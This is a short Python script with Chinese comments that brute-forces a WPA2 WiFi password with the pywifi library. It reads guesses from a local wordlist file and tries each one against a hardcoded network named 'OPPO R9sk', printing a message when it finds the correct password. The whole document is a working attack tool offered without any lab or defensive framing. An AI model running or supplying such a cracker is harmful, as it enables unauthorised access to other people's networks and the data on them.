import pywifi
import time
from pywifi import const

# 导入模块
# 抓取网卡接口
# 断开所有连接的WiFi
# 测试连接
# 读取密码本
# 设置睡眠时间


# 测试连接 返回连接结果
def wificonnect(pwd):
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开所有连接
    ifaces.disconnect()
    time.sleep(1)
    wifistatus = ifaces.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        # 创建WiFi连接文件
        profile = pywifi.Profile()
        # 要连接WiFi的名称
        profile.ssid = "OPPO R9sk"
        # 网卡的开放状态
        profile.auth = const.AUTH_ALG_OPEN
        # WiFi的加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 调用密码
        profile.key = pwd
        # 删除所有的WiFi文件
        ifaces.remove_all_network_profiles()
        # 设定新的连接WiFI文件
        tep_profile = ifaces.add_network_profile(profile)
        # 用新的来连接文件 去测试新连接的WiFi
        ifaces.connect(tep_profile)
        # 连接WiFi的时间
        time.sleep(4)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print("已经连接！")

# wificonnect()











def readPassword():
    print("开始破解：")
    path = "D:\\PHPProgram\\text\\pass.txt"
    # 打开文件
    file = open(path,"r")
    while True:
        # 读取文件出现错误
        try:
            # readline读取密码本中的一行
            passStr = file.readline()
            bool = wificonnect(passStr)
            if bool:
                print("密码正确",passStr)
                # 跳出当前循环
                break
            else:
                print("密码不正确", passStr)
        except:
            # 跳出当前循环  肢解进行下一次的循环
            continue

readPassword()